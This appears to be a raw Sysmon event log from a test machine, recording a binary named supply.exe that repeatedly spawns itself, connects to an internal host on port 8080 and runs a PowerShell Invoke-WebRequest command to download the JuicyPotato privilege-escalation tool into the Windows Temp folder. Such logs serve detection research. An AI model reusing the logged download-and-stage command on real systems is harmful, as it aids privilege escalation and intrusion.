{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-328D-6095-D505-000000001D00","ProcessId":8520,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50834,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:01.990"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2381,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.214978Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-DD05-000000001D00","ParentProcessId":8624,"ProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ProcessId":8636,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.451"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2382,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.454642Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.478","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ProcessId":8636,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86362\\msvcm90.dll","UtcTime":"2021-05-07 12:29:03.478"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2383,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.489421Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-328E-6095-D705-000000001D00","ProcessId":8548,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50836,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.437"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2384,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.489466Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.478","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ProcessId":8636,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86362\\msvcp90.dll","UtcTime":"2021-05-07 12:29:03.478"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2385,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.514082Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.493","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ProcessId":8636,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86362\\msvcr90.dll","UtcTime":"2021-05-07 12:29:03.493"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2386,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.514150Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.510","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ProcessId":8636,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86362\\python27.dll","UtcTime":"2021-05-07 12:29:03.510"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2387,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.514183Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-DE05-000000001D00","ParentProcessId":8636,"ProcessGuid":"747F3D96-328F-6095-DF05-000000001D00","ProcessId":8648,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.524"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2388,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.526021Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-DF05-000000001D00","ParentProcessId":8648,"ProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ProcessId":8664,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.765"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2389,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.767922Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.790","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ProcessId":8664,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86642\\msvcm90.dll","UtcTime":"2021-05-07 12:29:03.790"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2390,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.806921Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.790","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ProcessId":8664,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86642\\msvcp90.dll","UtcTime":"2021-05-07 12:29:03.790"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2391,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.806978Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.790","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ProcessId":8664,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86642\\msvcr90.dll","UtcTime":"2021-05-07 12:29:03.790"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2392,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.807006Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.806","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ProcessId":8664,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86642\\python27.dll","UtcTime":"2021-05-07 12:29:03.806"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2393,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.823883Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-E005-000000001D00","ParentProcessId":8664,"ProcessGuid":"747F3D96-328F-6095-E105-000000001D00","ProcessId":8676,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.833"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2394,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.836949Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-328E-6095-D905-000000001D00","ProcessId":8576,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50838,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.786"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2395,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.013505Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-E105-000000001D00","ParentProcessId":8676,"ProcessGuid":"747F3D96-3290-6095-E205-000000001D00","ProcessId":8688,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:04.082"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2396,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.084687Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:04.103","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3290-6095-E205-000000001D00","ProcessId":8688,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86882\\msvcm90.dll","UtcTime":"2021-05-07 12:29:04.103"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2397,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.124531Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:04.103","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3290-6095-E205-000000001D00","ProcessId":8688,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86882\\msvcp90.dll","UtcTime":"2021-05-07 12:29:04.119"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2398,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.124560Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:04.119","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3290-6095-E205-000000001D00","ProcessId":8688,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86882\\msvcr90.dll","UtcTime":"2021-05-07 12:29:04.119"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2399,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.124820Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:04.134","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3290-6095-E205-000000001D00","ProcessId":8688,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86882\\python27.dll","UtcTime":"2021-05-07 12:29:04.134"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2400,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:04.139985Z"}},"Version":2}}
